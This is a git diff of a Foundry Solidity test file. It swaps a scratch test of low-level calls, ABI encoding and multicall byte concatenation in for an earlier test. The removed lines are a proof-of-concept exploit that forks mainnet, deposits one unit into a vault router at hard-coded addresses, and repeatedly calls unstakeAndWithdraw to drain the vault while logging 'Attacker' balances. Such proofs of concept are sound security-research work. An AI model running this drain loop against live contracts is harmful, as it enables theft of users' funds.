@@ -3,65 +3,108 @@ pragma solidity ^0.8.13;
 
 import {Test, console2} from "forge-std/Test.sol";
 import {ERC4626Upgradeable, IERC20Upgradeable as IERC20, IERC20MetadataUpgradeable as IERC20Metadata, ERC20Upgradeable as ERC20} from "openzeppelin-contracts-upgradeable/token/ERC20/extensions/ERC4626Upgradeable.sol";
+import {Vault, IERC4626} from "../src/vault/Vault.sol";
+import {VaultFees} from "../src/interfaces/vault/IVault.sol";
 
-interface VaultRouter_I {
-    function depositAndStake(
-        address vault,
-        address gauge,
-        uint256 assetAmount,
-        address receiver
-    ) external;
+struct MultiCall {
+    address target;
+    bytes[] data;
+    uint256 dynIndex;
+    bool doesReturn;
+}
 
-    function unstakeAndWithdraw(
-        address vault,
-        address gauge,
-        uint256 burnAmount,
-        address receiver
-    ) external;
+contract ExternalProtocol {
+    function returnNumber(uint256) external returns (uint256) {
+        return uint256(1);
+    }
+
+    function returnAddress(uint256) external returns (address) {
+        return address(1);
+    }
+
+    function returnNothing(uint256) external {
+        return;
+    }
 }
 
 contract Tester is Test {
-    VaultRouter_I router =
-        VaultRouter_I(0x4995F3bb85E1381D02699e2164bC1C6c6Fa243cd);
-    address Vault = address(0x7CEbA0cAeC8CbE74DB35b26D7705BA68Cb38D725);
-    address adapter = address(0xF6Fe643cb8DCc3E379Cdc6DB88818B09fdF2200d);
-    IERC20 asset = IERC20(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7);
+    ExternalProtocol externalProtocol;
 
     function setUp() public {
-        vm.selectFork(vm.createFork("mainnet"));
+        externalProtocol = new ExternalProtocol();
     }
 
-    function testA() public {
-        deal(address(asset), address(this), 1);
-        console2.log(
-            "Initial Asset Attacker Balance:",
-            asset.balanceOf(address(this))
-        );
-        console2.log("Initial Asset Vault Balance:", asset.balanceOf(adapter));
+    function test_stuff() public {
+        bytes[] memory d = new bytes[](2);
+        d[0] = bytes("a");
+        d[1] = bytes("b");
+        emit log_bytes(bytes.concat(d[0], d[1]));
+        emit log_bytes(_concatArray(d));
 
-        {
-            // Deposit 1 to be able to burn
-            asset.approve(address(router), type(uint256).max);
-            router.depositAndStake(Vault, address(this), 1, address(this));
+        (bool success1, bytes memory res1) = address(externalProtocol).call(
+            abi.encodeWithSelector(
+                bytes4(keccak256("returnNumber(uint256)")),
+                uint256(0)
+            )
+        );
+        uint256 decoded1 = abi.decode(res1, (uint256));
+        emit log_named_uint("1", decoded1);
+
+        (bool success2, bytes memory res2) = address(externalProtocol).call(
+            abi.encodeWithSelector(
+                bytes4(keccak256("returnAddress(uint256)")),
+                uint256(0)
+            )
+        );
+        uint256 decoded2 = abi.decode(res2, (uint256));
+        emit log_named_uint("2", decoded2);
+
+        emit log_bytes(abi.encode(bytes4(keccak256("returnNothing(uint256)"))));
+        emit log_bytes(abi.encodePacked(uint256(1e18)));
+        emit log_bytes(
+            abi.encodeWithSelector(
+                bytes4(keccak256("returnNothing(uint256)")),
+                uint256(1e18)
+            )
+        );
+
+        // (bool success3, bytes memory res3) = address(externalProtocol).call(
+        // abi.encodeWithSelector(
+        //     bytes4(keccak256("returnNothing(uint256)")),
+        //     uint256(0)
+        // )
+        // );
+        // uint256 decoded3 = abi.decode(res3, (uint256));
+        // emit log_named_uint("3", decoded3);
+    }
+
+    // function test_stuff2() public {
+    //     bytes[] memory data = new bytes[](2);
+    //     data[0] =
+    //     MultiCall memory callData = MultiCall()
+    // }
+
+    function _execute(
+        MultiCall memory callData,
+        uint256 value
+    ) internal returns (uint256) {
+        if (callData.dynIndex > 0)
+            callData.data[callData.dynIndex] = abi.encode(value);
+        (bool success, bytes memory res) = callData.target.call(
+            _concatArray(callData.data)
+        );
+        if (callData.doesReturn) return abi.decode(res, (uint256));
+        return 0;
+    }
+
+    function _concatArray(
+        bytes[] memory array
+    ) internal returns (bytes memory) {
+        if (array.length == 1) return array[0];
+        bytes memory result = array[0];
+        for (uint256 i = 1; i < array.length; ++i) {
+            result = bytes.concat(result, array[i]);
         }
-
-        console2.log("======================================");
-        console2.log(
-            "During Asset Attacker Balance:",
-            asset.balanceOf(address(this))
-        );
-        console2.log("During Asset Vault Balance:", asset.balanceOf(adapter));
-        console2.log("======================================");
-
-        // Variable to assing times to abuse the exploit
-        for (uint i = 0; i < 50; i++) {
-            router.unstakeAndWithdraw(Vault, address(this), 1, address(this));
-        }
-
-        console2.log(
-            "Ending Asset Attacker Balance:",
-            asset.balanceOf(address(this))
-        );
-        console2.log("Ending Asset Vault Balance:", asset.balanceOf(adapter));
+        return result;
     }
 }
